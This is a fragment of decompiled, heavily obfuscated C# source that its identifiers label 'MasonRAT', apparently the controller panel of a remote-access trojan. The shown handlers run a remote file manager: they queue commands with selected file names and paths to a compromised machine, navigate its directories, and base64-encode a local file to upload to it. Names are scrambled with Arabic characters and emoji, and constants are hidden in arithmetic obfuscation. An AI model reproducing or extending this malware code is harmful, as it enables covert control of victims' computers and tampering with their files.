    Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 284) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + str));
    Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
  }

  private void \u2694️MasonRAT\u270C\u060Aـּ\u060E\u0609\u0609\u060A\u060Eـټ̍ط(
    object sender,
    EventArgs e)
  {
    Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 285) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FocusedItem.Text));
    Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
  }

  private void \u2694️MasonRAT\u270Cژ\u060Bڙ\u0020ــۙ̍\u0609ۙـ(object sender, KeyEventArgs e)
  {
    try
    {
      if (e.Modifiers == (Keys) ((13611102 ^ 23) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0 - ((-723581572 ^ -670826012) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 >> (768368725 + (181792491 | 1039897295) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0) && e.KeyCode == (Keys) ((1110093294 - 877974556 % 486581713 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0 ^ ((54191776 ^ 2098686992 % 277094242) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0 | (1467330076 | 1840739621) - 1466024797 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)))
      {
        if (this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Items.Count > 0)
        {
          try
          {
            foreach (ListViewItem listViewItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Items)
              listViewItem.Selected = true;
          }
          finally
          {
            IEnumerator enumerator;
            if (enumerator is IDisposable)
              (enumerator as IDisposable).Dispose();
          }
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
    if (e.KeyCode == (Keys) (-300982007 - 1211712537 % 1255092246 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 - ~((1512694554 ^ 6) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0))
    {
      e.SuppressKeyPress = true;
      try
      {
        if (this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FocusedItem.ImageIndex == 0 | this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FocusedItem.ImageIndex == 1 | this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FocusedItem.ImageIndex == ((1451365255 > 1415366215 ? -1214480775 : -1619307700) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0 ^ ~((1491205264 > 1944804446 ? 1619307697 : 1214480773) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0) | this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FocusedItem.ImageIndex == ((-1439141168 ^ (1835636803 | 82294224)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0 ^ -(1853866546 - 911708473 % 948117019 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1) | this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FocusedItem.ImageIndex == ((1572051101 | 1252533529) - 1434336296 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) - ((343667782 ^ 2068894726 >> 1426869647) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 >> ((1646153575 > 14595176 ? 127078049 : 169437398) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0)
        {
          if (this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.Length == 0)
          {
            Guna2TextBox masonRatىٽــ؁̨ـۙۧڞ;
            string str = (masonRatىٽــ؁̨ـۙۧڞ = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ).Text + this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FocusedItem.Text;
            masonRatىٽــ؁̨ـۙۧڞ.Text = str;
          }
          else
          {
            Guna2TextBox masonRatىٽــ؁̨ـۙۧڞ;
            string str = (masonRatىٽــ؁̨ـۙۧڞ = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ).Text + this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FocusedItem.Text + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 286);
            masonRatىٽــ؁̨ـۙۧڞ.Text = str;
          }
          this.\u2694️MasonRAT\u270Cڙب\u060E\u0609ـــۚــ\u060Bټ\u060C\u060F();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Debug.WriteLine(ex.Message);
        ProjectData.ClearProjectError();
      }
    }
    if (e.KeyCode != (Keys) (531967386 - 2112447607 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 - ~(1580480253 - (1700777864 >> 1199476602) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0))
      return;
    e.SuppressKeyPress = true;
    try
    {
      if (this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.Length < (1013382331 + 1251946782 % 2095127313 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + ((1470050276 ^ (119995783 | 744932430)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0)
      {
        this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 287);
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 288) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
      else
      {
        this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.Substring(0, this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.LastIndexOf(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 289)));
        this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.Substring(0, checked (this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.LastIndexOf(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 290)) + 1));
        this.\u2694️MasonRAT\u270Cڙب\u060E\u0609ـــۚــ\u060Bټ\u060C\u060F();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u060A\u060D̍ــﮪ\u060Eىڙـ\u060A\u060Dـ\u0609\u0609ـ\u060Dؤﻼ(
    object sender,
    EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 291) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + selectedItem.Text));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C̍ـ̍\u060Cۡــد\u060Bـ(object sender, EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 292) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + selectedItem.Text));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u0609ڙ\u0609\u060Cڙ\u060Dــڜۧ\u0609\u0608\u060Eּـڦـٸ\u060E(
    object sender,
    EventArgs e)
  {
    try
    {
      if (this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ.\u2694️MasonRAT\u270C\u060A\u060A\u060Bﯧڙﻻ\u0608ؤ\u0608\u060A)
        return;
      this.Close();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cڙ\u060Fۏ\u060Dڜـــۏٺــة̍ـ(object sender, EventArgs e)
  {
    try
    {
      Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 293) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 294)))));
      Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Aـ\u060D\u060Eۡؤ\u0608ٽـمۡٽ(object sender, EventArgs e)
  {
    string str;
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        string[] strArray = new string[(679242594 ^ ~1857718209) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 + (-1148203657 - 1959321806 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)];
        strArray[0] = str;
        strArray[1] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 295);
        strArray[(1888276815 - 838062893 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) - (-305353301 - -1355567221 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
        strArray[(1605837107 ^ 1419911352 >> 1841298997) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 - (999076863 + 606760852 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1)] = selectedItem.Text;
        strArray[(-103514720 ^ -1624742053) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 - (~608674544 - 1958494744 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 296);
        str = string.Concat(strArray);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
    string[] strArray1 = new string[(630579944 % 612848785 - 17731132 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 ^ 399943600 - (114460060 | 290858505) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0];
    strArray1[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 297);
    strArray1[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
    strArray1[1326467763 - 2075721306 % 1462662240 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 - ((1821227678 > 1635010050 ? 713408695 : 951211593) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 298);
